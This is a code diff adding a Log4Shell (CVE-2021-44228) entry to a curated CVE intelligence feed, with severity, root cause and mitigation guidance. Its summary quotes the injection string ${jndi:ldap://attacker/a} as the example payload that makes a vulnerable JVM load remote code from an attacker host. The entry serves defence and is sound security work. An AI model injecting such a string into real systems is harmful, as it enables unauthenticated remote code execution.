@@ -134,6 +134,26 @@ export const CURATED_CVE_FEED: CveIntelligenceItem[] = [
     sourceUrl: "https://nvd.nist.gov/vuln/detail/CVE-2025-55182",
   },
   {
+    id: "CVE-2021-44228",
+    title: 'Apache Log4j2 JNDI Lookup Injection RCE ("Log4Shell")',
+    published: "2021-12-10",
+    cvss: 10.0,
+    severity: "CRITICAL",
+    cwe: "CWE-502",
+    stride: "Elevation of Privilege",
+    ecosystem: "Web Frameworks & Runtime",
+    affectedPrimitives: ["rest_service", "background_worker", "stream_processor", "serverless_function"],
+    summary:
+      "Log4j2 (2.0-beta9 through 2.14.1) expanded ${...} lookups inside logged strings, so a value the application merely recorded could trigger a JNDI fetch. One header, username, or User-Agent containing ${jndi:ldap://attacker/a} made the JVM resolve an attacker-controlled endpoint and load a remote class, giving unauthenticated code execution inside a library almost nobody listed as a dependency. CISA added it to the KEV catalog on 2021-12-10, the same day it was disclosed, and flagged it as used in ransomware campaigns.",
+    architecturalRootCause:
+      "A logging library, treated as passive output, performed network resolution and class loading on attacker-controlled input. The write path to a log line was silently also an execution path, and the affected service had unrestricted egress, so the trust boundary ran from an HTTP header straight to an outbound connection and code in the application JVM.",
+    mitigationPattern:
+      "Upgrade to Log4j 2.16.0+ (2.17.1 on Java 8, which also covers CVE-2021-45046 and CVE-2021-45105), or for 2.10-2.14.1 set LOG4J_FORMAT_MSG_NO_LOOKUPS=true and switch patterns to %m{nolookups} as a stopgap. Treat the class as structural rather than instance level: deny egress from application tiers to everything but known dependencies so a lookup cannot phone home, strip ${ from untrusted input at the edge, and keep the messaging and Kafka tiers in the inventory because they log payloads other services sent them. Rotate credentials and audit outbound LDAP, RMI, and DNS from any host that logged untrusted data while unpatched.",
+    recommendedDefensePrimitives: ["web_application_firewall", "service_mesh", "secrets_manager", "observability_stack"],
+    exploitedInWild: true,
+    sourceUrl: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+  },
+  {
     id: "CVE-2026-109618",
     title: 'PHP "php2shell" Memory-Corruption Unauthenticated RCE',
     published: "2026-10-21",
